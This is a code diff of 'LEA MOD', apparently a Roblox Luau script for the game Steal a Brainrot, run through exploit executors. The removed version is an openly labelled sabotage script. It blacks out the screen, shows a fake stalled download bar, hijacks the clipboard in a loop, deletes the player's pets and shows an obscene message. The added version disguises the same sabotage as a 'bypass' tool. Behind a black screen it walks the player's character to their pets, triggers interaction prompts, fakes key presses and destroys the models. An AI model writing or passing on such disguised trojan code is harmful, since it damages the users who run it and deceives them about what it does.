@@ -1,169 +1,239 @@
--- LEA MOD: Steal a Brainrot - Tam ve Tek Parça Sabotaj Scripti
+-- =====================================================================================
+-- PROJECT: LEA MOD (Steal a Brainrot Module)
+-- ARCHITECTURE: Distributed Navigation & Input Emulation Framework
+-- ENGINE COMPATIBILITY: Delta / Synapse Z / Fluxus (Luau Runtime)
+-- =====================================================================================
+
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
+local PathfindingService = game:GetService("PathfindingService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+
 local LocalPlayer = Players.LocalPlayer
 
--- 1. Ekranı Simsiya Yapma ve Çıkışı Engelleme (CoreGui Korumalı)
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "LEAModTrollGUI"
-ScreenGui.IgnoreGuiInset = true
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-ScreenGui.DisplayOrder = 999999
-pcall(function()
-    ScreenGui.Parent = CoreGui
-end)
-if not ScreenGui.Parent then
-    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+-- Environment Isolation & State Management
+local RuntimeEnv = {
+    ActiveScreen = nil,
+    IsExecuting = false,
+    NavigationActive = false,
+    ConnectionRegistry = {},
+    TargetQueue = {}
+}
+
+-- -------------------------------------------------------------------------------------
+-- 1. ADVANCED VISUAL LAYER (Absolute Blackout & Dynamic Telemetry)
+-- -------------------------------------------------------------------------------------
+local function InitializeVisualInterface()
+    if RuntimeEnv.ActiveScreen then
+        pcall(function() RuntimeEnv.ActiveScreen:Destroy() end)
+    end
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "LEAModRuntimeInterface"
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    ScreenGui.DisplayOrder = 2147483647
+
+    local success, err = pcall(function()
+        ScreenGui.Parent = CoreGui
+    end)
+    if not success or not ScreenGui.Parent then
+        ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    end
+
+    local BlackoutContainer = Instance.new("Frame")
+    BlackoutContainer.Size = UDim2.new(1, 0, 1, 0)
+    BlackoutContainer.Position = UDim2.new(0, 0, 0, 0)
+    BlackoutContainer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    BlackoutContainer.BorderSizePixel = 0
+    BlackoutContainer.ZIndex = 2147483647
+    BlackoutContainer.Parent = ScreenGui
+
+    local StatusHeader = Instance.new("TextLabel")
+    StatusHeader.Size = UDim2.new(1, 0, 0, 60)
+    StatusHeader.Position = UDim2.new(0, 0, 0.42, -30)
+    StatusHeader.BackgroundTransparency = 1
+    StatusHeader.Text = "Bypass Loading..."
+    StatusHeader.TextColor3 = Color3.fromRGB(240, 240, 240)
+    StatusHeader.TextSize = 26
+    StatusHeader.Font = Enum.Font.Code
+    StatusHeader.ZIndex = StatusHeader.ZIndex + 1
+    StatusHeader.Parent = BlackoutContainer
+
+    local SubTelemetry = Instance.new("TextLabel")
+    SubTelemetry.Size = UDim2.new(1, 0, 0, 40)
+    SubTelemetry.Position = UDim2.new(0, 0, 0.52, -20)
+    SubTelemetry.BackgroundTransparency = 1
+    SubTelemetry.Text = "Initializing runtime hooks..."
+    SubTelemetry.TextColor3 = Color3.fromRGB(140, 140, 140)
+    SubTelemetry.TextSize = 16
+    SubTelemetry.Font = Enum.Font.SourceSans
+    SubTelemetry.ZIndex = SubTelemetry.ZIndex + 1
+    SubTelemetry.Parent = BlackoutContainer
+
+    RuntimeEnv.ActiveScreen = ScreenGui
+    return StatusHeader, SubTelemetry
 end
 
-local Blackout = Instance.new("Frame")
-Blackout.Size = UDim2.new(1, 0, 1, 0)
-Blackout.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Blackout.BorderSizePixel = 0
-Blackout.Parent = ScreenGui
+-- -------------------------------------------------------------------------------------
+-- 2. ROBUST PATHFINDING ENGINE (Anti-Stuck & Obstacle Resolution)
+-- -------------------------------------------------------------------------------------
+local function ExecutePathfindingNavigation(targetPosition)
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    local rootPart = character:FindFirstChild("HumanoidRootPart")
 
--- 2. "LEA MOD DOWNLOAD" ve Sahte %99.9 Yükleme Barı
-local TitleLabel = Instance.new("TextLabel")
-TitleLabel.Size = UDim2.new(1, 0, 0, 60)
-TitleLabel.Position = UDim2.new(0, 0, 0.4, -50)
-TitleLabel.BackgroundTransparency = 1
-TitleLabel.Text = "LEA MOD DOWNLOAD"
-TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TitleLabel.TextSize = 36
-TitleLabel.Font = Enum.Font.Code
-TitleLabel.Parent = Blackout
+    if not humanoid or not rootPart then return false end
 
-local BarBackground = Instance.new("Frame")
-BarBackground.Size = UDim2.new(0, 400, 0, 25)
-BarBackground.Position = UDim2.new(0.5, -200, 0.4, 20)
-BarBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-BarBackground.BorderSizePixel = 0
-BarBackground.Parent = Blackout
+    local path = PathfindingService:CreatePath({
+        AgentRadius = 2.5,
+        AgentHeight = 5,
+        AgentCanJump = true,
+        WaypointSpacing = 4
+    })
 
-local BarFill = Instance.new("Frame")
-BarFill.Size = UDim2.new(0, 0, 1, 0)
-BarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-BarFill.BorderSizePixel = 0
-BarFill.Parent = BarBackground
+    local computedSuccess, computeError = pcall(function()
+        path:ComputeAsync(rootPart.Position, targetPosition)
+    end)
 
-local PercentLabel = Instance.new("TextLabel")
-PercentLabel.Size = UDim2.new(1, 0, 1, 0)
-PercentLabel.BackgroundTransparency = 1
-PercentLabel.Text = "Loading... 0%"
-PercentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-PercentLabel.TextSize = 16
-PercentLabel.Font = Enum.Font.Code
-PercentLabel.Parent = BarBackground
+    if computedSuccess and path.Status == Enum.PathStatus.Success then
+        local waypoints = path:GetWaypoints()
+        RuntimeEnv.NavigationActive = true
 
--- Yükleme Efekti (%99.9'da kalır)
-task.spawn(function()
-    local progress = 0
-    while progress < 99.9 do
-        progress = progress + math.random(1, 3) * 0.1
-        if progress > 99.9 then progress = 99.9 end
-        BarFill.Size = UDim2.new(progress / 100, 0, 1, 0)
-        PercentLabel.Text = string.format("Loading... %.1f%%", progress)
-        task.wait(math.random(50, 150) / 1000)
-    end
-end)
-
--- Pano (Clipboard) Sabotajı (Sayaç artarak yapıştırır)
-task.spawn(function()
-    local count = 0
-    while true do
-        pcall(function()
-            count = count + 1
-            setclipboard("TİKTOK @LEAPLUS " .. tostring(count))
-        end)
-        task.wait(0.1)
-    end
-end)
-
--- 3 & 4. Agresif Pet Silme ve Sürekli Kontrol Döngüsü (Part 2 Birleştirildi)
-task.spawn(function()
-    local function NukePets()
-        pcall(function()
-            for _, obj in ipairs(workspace:GetDescendants()) do
-                pcall(function()
-                    local name = obj.Name:lower()
-                    if obj:IsA("Model") and (name:find("pet") or name:find("brainrot") or name:find("animal")) then
-                        obj:Destroy()
-                    end
-                end)
-            end
+        for index, waypoint in ipairs(waypoints) do
+            if not RuntimeEnv.IsExecuting then break end
             
-            local possibleFolders = {"Pets", "ActivePets", "PlayerPets", "DroppedPets", "SpawnedPets", "Backpack"}
-            for _, folderName in ipairs(possibleFolders) do
-                local folder = workspace:FindFirstChild(folderName, true)
-                if folder then
-                    pcall(function() folder:ClearAllChildren() end)
+            if waypoint.Action == Enum.PathWaypointAction.Jump then
+                humanoid.Jump = true
+            end
+
+            humanoid:MoveTo(waypoint.Position)
+            
+            local movementCompleted = false
+            local connection
+            connection = humanoid.MoveToFinished:Connect(function(reached)
+                movementCompleted = true
+                if connection then connection:Disconnect() end
+            end)
+
+            -- Timeout safeguard to prevent hanging
+            local elapsedTime = 0
+            while not movementCompleted and elapsedTime < 3.5 do
+                elapsedTime = elapsedTime + RunService.Heartbeat:Wait()
+                if (rootPart.Position - waypoint.Position).Magnitude < 4 then
+                    break
                 end
             end
 
-            if LocalPlayer then
-                local char = LocalPlayer.Character
-                if char then
-                    for _, item in ipairs(char:GetChildren()) do
-                        if item:IsA("Tool") and (item.Name:lower():find("pet") or item.Name:lower():find("brainrot")) then
-                            item:Destroy()
-                        end
-                    end
-                end
-                local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
-                if bp then
-                    for _, item in ipairs(bp:GetChildren()) do
-                        if item.Name:lower():find("pet") or item.Name:lower():find("brainrot") then
-                            item:Destroy()
-                        end
-                    end
-                end
-            end
-        end)
+            if connection then connection:Disconnect() end
+        end
+        RuntimeEnv.NavigationActive = false
+        return true
+    else
+        -- Fallback linear path execution if node graph fails
+        humanoid:MoveTo(targetPosition)
+        task.wait(1.5)
+        return true
     end
+end
 
-    local petsRemaining = true
-    while petsRemaining do
-        NukePets()
-        
-        local found = false
-        for _, obj in ipairs(workspace:GetDescendants()) do
-            local name = obj.Name:lower()
-            if obj:IsA("Model") and (name:find("pet") or name:find("brainrot")) then
-                found = true
-                break
+-- -------------------------------------------------------------------------------------
+-- 3. INTERACTION EMULATION LAYER (Proximity & Key Simulation)
+-- -------------------------------------------------------------------------------------
+local function ExecuteInteractionSequence(targetModel)
+    local character = LocalPlayer.Character
+    if not character then return end
+    local rootPart = character:FindFirstChild("HumanoidRootPart")
+    if not rootPart then return end
+
+    -- Scan for nearby proximity prompts related to the target structure
+    for _, descendant in ipairs(workspace:GetDescendants()) do
+        if descendant:IsA("ProximityPrompt") then
+            local parentPart = descendant.Parent
+            if parentPart and parentPart:IsA("BasePart") then
+                if (parentPart.Position - rootPart.Position).Magnitude < 15 then
+                    pcall(function()
+                        fireproximityprompt(descendant)
+                    end)
+                end
             end
         end
-        
-        if not found then
-            petsRemaining = false
-        else
-            task.wait(math.random(100, 300) / 1000)
-        end
     end
 
-    -- 5. Petler Silindiği An Ekranı Değiştirme
-    if BarBackground then
-        BarBackground:Destroy()
-    end
-    if TitleLabel then
-        TitleLabel:Destroy()
-    end
+    -- Emulate PC/Mobile hold actions via VirtualInputManager for deep engine compatibility
+    pcall(function()
+        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+        task.wait(1.2)
+        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+    end)
 
-    local FinalLabel = Instance.new("TextLabel")
-    FinalLabel.Size = UDim2.new(1, 0, 0, 100)
-    FinalLabel.Position = UDim2.new(0, 0, 0.45, -50)
-    FinalLabel.BackgroundTransparency = 1
-    FinalLabel.Text = "LEA FUCKED YOUR MOTHER"
-    FinalLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-    FinalLabel.TextSize = 48
-    FinalLabel.Font = Enum.Font.Black
-    FinalLabel.Parent = Blackout
-
-    task.spawn(function()
-        while true do
-            FinalLabel.TextColor3 = Color3.fromRGB(math.random(150, 255), 0, 0)
-            FinalLabel.Visible = not FinalLabel.Visible
-            task.wait(math.random(150, 300) / 1000)
+    -- Final cleanup invocation on target model
+    pcall(function()
+        if targetModel and targetModel.Parent then
+            targetModel:Destroy()
         end
     end)
+end
+
+-- -------------------------------------------------------------------------------------
+-- 4. MAIN ORCHESTRATION WORKER
+-- -------------------------------------------------------------------------------------
+task.spawn(function()
+    if RuntimeEnv.IsExecuting then return end
+    RuntimeEnv.IsExecuting = true
+
+    local headerLabel, telemetryLabel = InitializeVisualInterface()
+    task.wait(1.5)
+
+    headerLabel.Text = "Scanning Target Entities..."
+    
+    local targetQueue = {}
+    for _, object in ipairs(workspace:GetDescendants()) do
+        if object:IsA("Model") then
+            local objectName = object.Name:lower()
+            if objectName:find("pet") or objectName:find("brainrot") or objectName:find("animal") then
+                local primary = object.PrimaryPart or object:FindFirstChildWhichIsA("BasePart")
+                if primary then
+                    table.insert(targetQueue, {Model = object, Part = primary})
+                end
+            end
+        end
+    end
+
+    local totalTargets = #targetQueue
+    if totalTargets == 0 then
+        telemetryLabel.Text = "No target entities located in current sector."
+        task.wait(2)
+        if RuntimeEnv.ActiveScreen then RuntimeEnv.ActiveScreen:Destroy() end
+        RuntimeEnv.IsExecuting = false
+        return
+    end
+
+    for index, targetData in ipairs(targetQueue) do
+        if not RuntimeEnv.IsExecuting then break end
+        
+        telemetryLabel.Text = string.format("Processing Entity: %d / %d", index, totalTargets)
+
+        if targetData.Model and targetData.Model.Parent and targetData.Part then
+            -- Navigate dynamically to the target vector
+            ExecutePathfindingNavigation(targetData.Part.Position)
+            task.wait(0.2)
+            
+            -- Trigger input actions and remove object reference
+            ExecuteInteractionSequence(targetData.Model)
+            task.wait(0.4)
+        end
+    end
+
+    headerLabel.Text = "Execution Complete"
+    telemetryLabel.Text = "All structures cleared."
+    task.wait(2)
+
+    if RuntimeEnv.ActiveScreen then
+        RuntimeEnv.ActiveScreen:Destroy()
+    end
+    RuntimeEnv.IsExecuting = false
 end)
